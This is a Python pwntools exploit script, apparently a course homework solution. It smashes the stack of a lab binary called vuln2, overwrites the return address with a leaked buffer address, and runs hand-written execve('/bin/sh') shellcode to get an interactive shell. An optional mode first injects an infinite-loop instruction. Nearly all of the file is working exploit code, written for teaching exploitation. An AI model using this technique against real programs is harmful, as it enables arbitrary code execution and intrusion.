#!/usr/bin/env python3
"""Solution for Problem 4: inject a HAND-WRITTEN /bin/sh shellcode.

Same target as vuln2 (return-to-stack), but the shellcode is not
shellcraft.sh() -- it is assembled from solution3/shellcode.s, which you wrote
by hand. This is the lecture's homework (slide 25).

Two steps, matching the lecture:
  1) Confirm control with the 2-byte infinite-loop shellcode `jmp $` == eb fe
     (slide 24-25). Run with `--confirm`: if the process HANGS, the return
     address is under your control.  Ctrl-C to stop it.
  2) Inject your real execve("/bin/sh") shellcode from shellcode.s and get a
     shell (default run).

Layout inside buf (identical to solve_vuln2):
  [ NOP sled ............ ][ shellcode ][ return addr = start of buf ]

Run:
  cd example3 && make
  python3 solution3/solve_vuln4.py --confirm   # step 1: prove control (hangs)
  python3 solution3/solve_vuln4.py             # step 2: real shell
"""
import os
import sys
from pwn import *

context.update(arch="i386", os="linux", log_level="info")

HERE = os.path.dirname(os.path.abspath(__file__))
BIN = os.path.join(HERE, "..", "vuln2")        # reuse the vuln2 return-to-stack target
SHELLCODE_SRC = os.path.join(HERE, "shellcode.s")

# GAS directives pwntools supplies itself; strip them so we can feed our .s
# file straight to asm() and keep only the instructions/labels.
_DIRECTIVES = (".intel_syntax", ".att_syntax", ".global", ".globl",
               ".section", ".text", ".data", ".bss", ".type", ".size")


def load_shellcode(path):
    """Assemble a hand-written .s file into raw bytes with pwntools asm()."""
    lines = []
    for raw in open(path):
        line = raw.split("#", 1)[0].strip()          # drop comments / blanks
        if not line or line.startswith(_DIRECTIVES):
            continue
        lines.append(line)
    sc = asm("\n".join(lines))
    log.success("assembled shellcode.s -> %d bytes: %s", len(sc), enhex(sc))
    return sc


def find_offset():
    """cyclic + core dump -> buf -> return address offset (same as vuln2)."""
    io = process(BIN)
    io.recvuntil(b"payload:\n")
    io.sendline(cyclic(400))
    io.wait()
    off = cyclic_find(io.corefile.eip)
    io.close()
    log.success("offset(buf -> return address) = %d", off)
    return off


def main():
    confirm = "--confirm" in sys.argv

    if confirm:
        shellcode = asm("jmp $")            # eb fe -- infinite loop (slide 25)
        log.info("confirm mode: injecting eb fe; the process should HANG")
    else:
        shellcode = load_shellcode(SHELLCODE_SRC)

    offset = find_offset()

    io = process(BIN)
    buf_addr = int(io.recvline_startswith(b"buf is at ").split()[-1], 16)
    log.success("leaked buf @ %#x", buf_addr)
    io.recvuntil(b"payload:\n")

    # Shellcode at the START of buf (NOP padding after). ESP sits just above
    # buf on return and its pushes grow down, so shellcode at the top would
    # clobber its own tail; at the bottom it stays clear.
    payload = shellcode + b"\x90" * (offset - len(shellcode))
    assert len(payload) == offset, "shellcode larger than the buffer"
    payload += p32(buf_addr)                                     # return to buf start = shellcode

    io.sendline(payload)

    if confirm:
        log.info("if this hangs, control is yours -- press Ctrl-C to stop")
        io.recvall(timeout=5)               # expect no output: it is looping
        return

    log.success("hand-written shellcode injected -- checking for a shell")
    io.sendline(b"id; uname -a; echo HANDWRITTEN_PWNED")
    io.interactive()


if __name__ == "__main__":
    main()
